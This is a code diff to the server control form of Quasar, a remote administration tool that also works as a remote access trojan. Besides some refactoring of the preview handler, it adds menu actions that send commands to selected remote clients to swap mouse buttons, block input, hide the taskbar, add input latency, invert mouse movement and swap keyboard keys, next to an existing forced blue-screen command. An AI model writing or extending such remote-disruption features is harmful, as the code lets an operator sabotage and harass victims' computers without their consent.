@@ -39,7 +39,7 @@ namespace Quasar.Server.Forms
         private readonly object _processingClientConnectionsLock = new object();
         private readonly object _lockClients = new object(); // lock for clients-listview
 
-        private GetPreviewImageHandler _previewImageHandler;
+        private PreviewHandler _previewImageHandler;
 
 
         public FrmMain()
@@ -167,7 +167,7 @@ namespace Quasar.Server.Forms
 
         private void FrmMain_Load(object sender, EventArgs e)
         {
-            SetEqualColumnWidths();
+            //SetEqualColumnWidths();
             InitializeServer();
             AutostartListening();
             notifyIcon.Visible = false;
@@ -219,7 +219,7 @@ namespace Quasar.Server.Forms
                     _previewImageHandler.Dispose();
                 }
 
-                _previewImageHandler = new GetPreviewImageHandler(selectedClients[0], pictureBoxMain);
+                _previewImageHandler = new PreviewHandler(selectedClients[0], pictureBoxMain, listView1);
                 MessageHandler.Register(_previewImageHandler);
 
                 GetPreviewImage image = new GetPreviewImage
@@ -824,6 +824,54 @@ namespace Quasar.Server.Forms
             foreach (Client c in GetSelectedClients())
             {
                 c.Send(new DoBSOD());
+            }
+        }
+
+        private void swapMouseButtonsToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            foreach (Client c in GetSelectedClients())
+            {
+                c.Send(new DoSwapMouseButtons());
+            }
+        }
+
+        private void blockInputToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            foreach (Client c in GetSelectedClients())
+            {
+                c.Send(new DoBlockInput());
+            }
+        }
+
+        private void hideTaskBarToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            foreach (Client c in GetSelectedClients())
+            {
+                c.Send(new DoHideTaskbar());
+            }
+        }
+
+        private void inputLatencyToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            foreach (Client c in GetSelectedClients())
+            {
+                c.Send(new DoInputLatency());
+            }
+        }
+
+        private void invertMouseMovementToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            foreach (Client c in GetSelectedClients())
+            {
+                c.Send(new DoInvertMouseMovement());
+            }
+        }
+
+        private void swapKeyboardKeysToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            foreach (Client c in GetSelectedClients())
+            {
+                c.Send(new DoChangeKeys());
             }
         }
         #endregion
